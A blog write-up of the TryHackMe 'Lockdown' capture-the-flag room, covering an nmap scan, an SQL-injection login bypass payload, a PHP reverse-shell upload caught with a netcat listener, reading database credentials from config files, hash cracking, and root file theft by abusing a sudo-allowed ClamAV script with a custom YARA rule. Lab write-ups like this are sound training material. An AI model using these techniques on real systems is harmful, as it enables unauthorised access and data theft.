---
author: "Shebu"
title: "Lockdown: THM"
date: "2021-11-27"
tags: ["sql-injection", "file-upload", "yara"]
cover:
    image: img/lockdown.jpg
    alt: "Lockdown: THM"
    caption: "Lockdown: THM"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

# Description
-----------------------------

Stay at 127.0.0.1. Wear a 255.255.255.0

|  **Room name** 	| Lockdown                                              |
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| https://tryhackme.com/room/lockdown                	|
|   **Creator**  	| [hangrymoose](https://tryhackme.com/p/hangrymoose) 	|

# Enumeration
-----------------------

## Portscan 
----------------------

```bash
➜  lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap

# Nmap 7.91 scan initiated Mon Nov  8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58
Nmap scan report for 10.10.252.58
Host is up (0.35s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA)
|   256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA)
|_  256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Coronavirus Contact Tracer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  8 03:56:56 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds

```

## Website: Port 80
----------------------

Add `contacttracer.thm` to your `/etc/hosts` file.

Visiting website at port 80 gives us this simple page of Coronavirus contact tracer.

*[Image: website1]*

The link to admin panel which lead  to  `/login.php` had a login form .

*[Image: login]*

_login.php_

## sqli auth-bypass
-------------------------

I tried simple sqli auth bypass payload like `admin' OR 1=1-- ` and to my surprise I was logged in !

*[Image: website2]*

# Shell as www-data
-------------------------

Browsing through the application I finally reached the settings page which had an `upload image functionality` .

*[Image: upload]*

I was not sure whether .php file could be uploaded .If not then I would have to rename it to something like shell.php.jpg .

I first tried uploading `php-reverse-shell.php` script & it was succesfully uploaded.

Now I went back to `contacttracer.thm` and opened the image in new tab .Make sure to setup nc listener before this.

*[Image: website3]*

*[Image: website4]*

The page keeps on loading which is a good sign that means the reverse shell connected back to our nc listener!

*[Image: revshell]*

So now we are in as `www-data` .
# Shell as cyrus
------------------------

There are 3 users on this machine `root`,`cyrus` & `maxine`

```bash
www-data@lockdown:/$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
maxine:x:1000:1000:maxine:/home/maxine:/bin/bash
cyrus:x:1001:1001::/home/cyrus:/bin/bash
```

The `/var/www/html` directory contained `config.php` file which had a password hash.
```bash
www-data@lockdown:/var/www/html$ cat config.php
cat config.php
<?php
session_start();
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2***********df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://contacttracer.thm/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;

function redirect($url=''){
        if(!empty($url))
        echo '<script>location.href="'.base_url .$url.'"</script>';
}
function validate_image($file){
        if(!empty($file)){
                if(@getimagesize(base_url.$file)){
                        return base_url.$file;
                }else{
                        return base_url.'dist/img/no-image-available.png';
                }
        }else{
                return base_url.'dist/img/no-image-available.png';
        }
```
Cracked it but was not useful since I couldn't switch to any of the two users.

On further enumeration, `/classes` directory a file called `DBConnection.php` had a username & password for accesing mysql database .

```bash
www-data@lockdown:/var/www/html/classes$ ls -al
ls -al
total 52
drwxr-xr-x  2 www-data www-data 4096 May 11  2021 .
drwxr-xr-x 11 www-data www-data 4096 May 11  2021 ..
-rw-r--r--  1 www-data www-data 1770 May 11  2021 City.php
-rw-r--r--  1 www-data www-data  653 May 11  2021 DBConnection.php
-rw-r--r--  1 www-data www-data 2811 May 11  2021 Establishment.php
-rw-r--r--  1 www-data www-data 1880 May 11  2021 Login.php
-rw-r--r--  1 www-data www-data 1011 May 11  2021 Main.php
-rw-r--r--  1 www-data www-data 2991 May 11  2021 People.php
-rw-r--r--  1 www-data www-data 1788 May 11  2021 State.php
-rw-r--r--  1 www-data www-data 3606 May 11  2021 SystemSettings.php
-rw-r--r--  1 www-data www-data    4 May 11  2021 TEST.php
-rw-r--r--  1 www-data www-data 2145 May 11  2021 Users.php
-rw-r--r--  1 www-data www-data 1800 May 11  2021 Zone.php
```
```php
www-data@lockdown:/var/www/html/classes$ cat DBConnection.php
cat DBConnection.php
<?php
class DBConnection{

    private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoR********9tvq2UdNWE';
    private $database = 'cts_db';
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
```

Logging into `cts_db` database to retreive some juicy info .

```sql
www-data@lockdown:/var/www/html/classes$ mysql -h localhost -u cts -pYOUMKt**********9tvq2UdNWE -D cts_db       

mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 212
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| cts_db             |
+--------------------+
2 rows in set (0.00 sec)

mysql> use cts_db;

Database changed
mysql> show tables;

+------------------+
| Tables_in_cts_db |
+------------------+
| barangay_list    |
| city_list        |
| establishment    |
| people           |
| state_list       |
| system_info      |
| tracks           |
| users            |
+------------------+
8 rows in set (0.00 sec)

mysql> SELECT * FROM users;

+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

I cracked the password hash using crackstation.net .

*[Image: crackstation]*

Now we have the password .Lets  switch to `cyrus` user.
## user.txt 🚩
-------------------

Grab the `user.txt` flag !
```bash
cyrus@lockdown:~$ cat user.txt
cat user.txt
THM{w4c1F5Au********Zyp0QJDIbWS}
```

# root.txt 🚩
---------------------

To get a stable shell , I uploaded my `id_rsa.pub` key to `authorized_keys` so that I could SSH into the machine directly .

The home directory contained the following: 

* A directory called `quarentine` which had nothing in it.
* A file called `testvirus`

`sudo -l` reveals that the user `cyrus` could run `/opt/scan/scan.sh` as root !

```bash
cyrus@lockdown:~$ sudo -l
[sudo] password for cyrus: 
Sorry, try again.
[sudo] password for cyrus: 
Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
```

```bash
cyrus@lockdown:~$ cat /opt/scan/scan.sh
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```
The script is executing a binary called `clamscan` .Time to google what it is.

>Clam AntiVirus (ClamAV) is a free software, cross-platform and open-source antivirus software toolkit able to detect many types of malicious software, including viruses.

So what the script does is it asks us for a path to a file & then it scans it using clamscan (anti-virus) and if the file is malicious ,it copies the file to `~/quarentine` directory. 

We had a testvirus file remember? Lets give it as i/p to this script.
```bash
 cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
Enter path: /home/cyrus/testvirus
/home/cyrus/testvirus: EICAR_MD5.UNOFFICIAL FOUND
/home/cyrus/testvirus: copied to '/home/cyrus/quarantine/testvirus'

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 0.103.2
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.011 sec (0 m 0 s)
Start Date: 2021:11:29 11:47:30
End Date:   2021:11:29 11:47:30
```
Since the file contained certain signatures which were declared as malicious in the clamscan database ,it identified the file as a virus and then sent it to ~/quarentine directory.

The database file which identifies virus is located at `/var/lib/clamav/main.hdb` which contained: `69630e4574ec6798239b091cda43dca0:69:EICAR_MD5` & so it flagged the testvirus file as malicious one.

After hours of googling , I found out a way to create `Yara signature rule` of our own to flag a malicious file .

>ClamAV can process YARA rules. ClamAV virus database file names ending with .yar or .yara are parsed as YARA rule files
>
>
>How to create rule: 
> * https://docs.clamav.net/manual/Signatures/YaraRules.html
>* https://yara.readthedocs.io/en/stable/writingrules.html

So I created a custom signature rule called `rule.yara` with the below code & saved it in `/var/lib/clamav` .

```bash
rule root
{
 strings:
  $s = "THM{" 
 condition:
  $s
}
```
This will flag a file which contains string like **THM{**  and flags it as a virus ,as a result the file gets stored in `~/quarentine` directory.

```bash
cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
Enter path: /root/root.txt
/root/root.txt: YARA.root.UNOFFICIAL FOUND
/root/root.txt: copied to '/home/cyrus/quarantine/root.txt'

----------- SCAN SUMMARY -----------
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.006 sec (0 m 0 s)
Start Date: 2021:11:29 12:21:13
End Date:   2021:11:29 12:21:13
```

Success , Grab the ``root.txt`` flag !

```bash
cyrus@lockdown:/var/lib/clamav$ cat ~/quarantine/root.txt 
THM{IQ23Em4V**********W9GZZJxm}
